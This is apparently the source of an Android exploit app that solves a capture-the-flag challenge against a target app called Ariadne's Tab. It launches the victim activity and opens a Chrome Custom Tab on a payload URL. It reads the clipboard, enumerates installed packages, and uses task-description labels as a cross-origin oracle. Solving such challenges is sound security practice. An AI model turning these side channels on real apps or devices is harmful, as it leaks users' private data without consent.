package xyz.ariadnetab.solver;

import android.app.Activity;
import android.app.ActivityManager;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.Signature;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import java.security.MessageDigest;

public final class MainActivity extends Activity {
    public static final String TAG = "TFCCTF";
    static final String CHROME = "com.android.chrome";
    static final String VICTIM = "com.tfcctf.ariadnetab";
    static final String VICTIM_ACT = "com.ariadnetab.mobile.OpenDocumentActivity";

    /** Viewer URL for a text/html document in our own account, regenerated by shot.py
     *  into Payload.java before every build. The render capability only lasts 60
     *  minutes, so a hard-coded URL here would silently ship an expired shot. */
    static final String PAYLOAD_URL = Payload.URL;

    static void log(String message) {
        int chunk = 3500;
        for (int offset = 0; offset < message.length(); offset += chunk) {
            Log.i(TAG, message.substring(offset, Math.min(message.length(), offset + chunk)));
        }
    }

    @Override
    protected void onCreate(Bundle state) {
        super.onCreate(state);
        log("=== solver start ===");
        dumpIntent(getIntent(), "launch");
        dumpEnvironment();

        try {
            startForegroundService(new Intent(this, Keeper.class));
            log("keeper start requested");
        } catch (Exception error) {
            log("keeper start FAILED " + error);
        }

        Handler handler = new Handler(Looper.getMainLooper());

        // SCHEDULE, rebuilt 2026-09-05T23:5xZ. The Digital Asset Links race is
        // refuted, so the old three-trigger interleave is gone and the whole
        // session is spent giving the iframe probe the longest possible run of
        // foreground time. A backgrounded Chrome tab has its timers throttled to
        // roughly once a minute, so our Custom Tab goes up once and STAYS up.
        //
        // t=0.3s  one victim OPEN_DOCUMENT with a throwaway id. This is the only
        //         thing on the device that can seed the bot's app-origin
        //         localStorage with a device keypair, and `loadEncodedKeys` only
        //         swallows the 8 s channel timeout when that keypair is already
        //         stored. If the bot's browser is already seeded this costs ~11 s
        //         and changes nothing; if it is not, nothing downstream works
        //         without it. Cheap insurance either way.
        // t=1.2s  on-device UUID sweep, while we still hold window focus, which
        //         the clipboard read needs.
        // t=12s   our content-origin page, which then owns the rest of the run.
        handler.postDelayed(() -> startVictim("11111111-1111-4111-8111-111111111111"), 300);
        handler.postDelayed(() -> new Sweep().run(this), 1200);
        handler.postDelayed(() -> openCustomTab(PAYLOAD_URL + "&r=1"), 12000);
        // Sample densely while the VICTIM's Custom Tab is the live one (t=0.3s to
        // t=12s), because that is the window in which its task-description label
        // would change if the seed document existed. Sparse samples afterwards.
        for (int at : new int[] {1500, 3000, 4500, 6000, 7500, 9000, 10500,
                                 14000, 25000, 40000}) {
            handler.postDelayed(() -> dumpTasks(), at);
        }
        handler.postDelayed(() -> log("=== solver idle ==="), 52000);
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        dumpIntent(intent, "newIntent");
    }

    static void dumpIntent(Intent intent, String label) {
        if (intent == null) {
            log("intent[" + label + "] null");
            return;
        }
        log("intent[" + label + "] action=" + intent.getAction() + " data=" + intent.getDataString()
                + " comp=" + intent.getComponent());
        Bundle extras = intent.getExtras();
        if (extras == null) {
            log("intent[" + label + "] no extras");
            return;
        }
        for (String key : extras.keySet()) {
            Object value = extras.get(key);
            log("intent[" + label + "] extra " + key + " = " + value);
        }
    }

    void dumpEnvironment() {
        log("sdk=" + android.os.Build.VERSION.SDK_INT + " model=" + android.os.Build.MODEL
                + " fp=" + android.os.Build.FINGERPRINT);
        PackageManager pm = getPackageManager();
        for (String name : new String[] {VICTIM, CHROME, "com.chrome.beta", "com.android.webview",
                "com.google.android.webview", "com.google.android.gms"}) {
            try {
                PackageInfo info = pm.getPackageInfo(name, PackageManager.GET_SIGNING_CERTIFICATES);
                StringBuilder builder = new StringBuilder();
                builder.append("pkg ").append(name).append(" v").append(info.versionName)
                        .append(" code=").append(info.getLongVersionCode());
                if (info.signingInfo != null) {
                    Signature[] signatures = info.signingInfo.getApkContentsSigners();
                    if (signatures != null && signatures.length > 0) {
                        builder.append(" sha256=").append(sha256(signatures[0].toByteArray()));
                    }
                }
                log(builder.toString());
            } catch (Exception error) {
                log("pkg " + name + " ABSENT (" + error.getClass().getSimpleName() + ")");
            }
        }
        try {
            java.util.List<android.content.pm.PackageInfo> all = pm.getInstalledPackages(0);
            StringBuilder builder = new StringBuilder("installed:");
            for (android.content.pm.PackageInfo info : all) {
                if (!info.packageName.startsWith("com.android.") &&
                        !info.packageName.startsWith("com.google.android.")) {
                    builder.append(' ').append(info.packageName);
                }
            }
            log(builder.toString());
        } catch (Exception error) {
            log("installed list failed " + error);
        }
    }

    static String sha256(byte[] input) {
        try {
            byte[] digest = MessageDigest.getInstance("SHA-256").digest(input);
            StringBuilder builder = new StringBuilder();
            for (byte value : digest) {
                builder.append(String.format("%02X", value));
            }
            return builder.toString();
        } catch (Exception error) {
            return "?";
        }
    }

    /** getAppTasks() returns our own tasks, and both the victim activity and
     *  Chrome's CustomTabActivity are launched into our task, so this shows
     *  whether they actually came up. */
    void dumpTasks() {
        try {
            ActivityManager am = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
            StringBuilder builder = new StringBuilder("tasks:");
            for (ActivityManager.AppTask task : am.getAppTasks()) {
                ActivityManager.RecentTaskInfo info = task.getTaskInfo();
                builder.append(" [top=").append(info.topActivity)
                       .append(" base=").append(info.baseActivity)
                       .append(" n=").append(info.numActivities);
                // THE TASK DESCRIPTION LABEL. Chrome sets a Custom Tab's task
                // description from the PAGE TITLE, and the Custom Tab runs inside
                // OUR task (measured in t12), so getAppTasks() can read it.
                // index.html is titled "Ariadne's Tab" and content/viewer.html is
                // titled "Document", so the label distinguishes "still on the app
                // origin" from "navigated to the viewer". That is an ownership
                // oracle for the VICTIM's own Custom Tab, which unlike our iframe
                // chain gets a real native port and therefore does not depend on
                // the bot's localStorage holding a device keypair.
                // Logging it here to find out whether the label actually tracks
                // the title before building anything on top of it.
                try {
                    ActivityManager.TaskDescription desc = info.taskDescription;
                    builder.append(" label=").append(desc == null ? "<null>" : desc.getLabel());
                } catch (Throwable inner) {
                    builder.append(" label=ERR").append(inner.getClass().getSimpleName());
                }
                builder.append(']');
            }
            log(builder.toString());
        } catch (Exception error) {
            log("tasks FAILED " + error);
        }
    }

    void openCustomTab(String url) {
        try {
            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            intent.setPackage(CHROME);
            Bundle session = new Bundle();
            session.putBinder("android.support.customtabs.extra.SESSION", null);
            intent.putExtras(session);
            intent.putExtra("androidx.browser.customtabs.extra.SHARE_STATE", 2);
            startActivity(intent);
            log("custom tab launched");
        } catch (Exception error) {
            log("custom tab FAILED " + error);
            try {
                Intent plain = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
                plain.setPackage(CHROME);
                startActivity(plain);
                log("plain chrome launched");
            } catch (Exception second) {
                log("plain chrome FAILED " + second);
            }
        }
    }

    void startVictim(String documentId) {
        try {
            Intent intent = new Intent("com.tfcctf.ariadnetab.OPEN_DOCUMENT");
            intent.setClassName(VICTIM, VICTIM_ACT);
            intent.putExtra("document_id", documentId);
            startActivity(intent);
            log("victim OpenDocumentActivity started with " + documentId);
        } catch (Exception error) {
            log("victim start FAILED " + error);
        }
    }
}
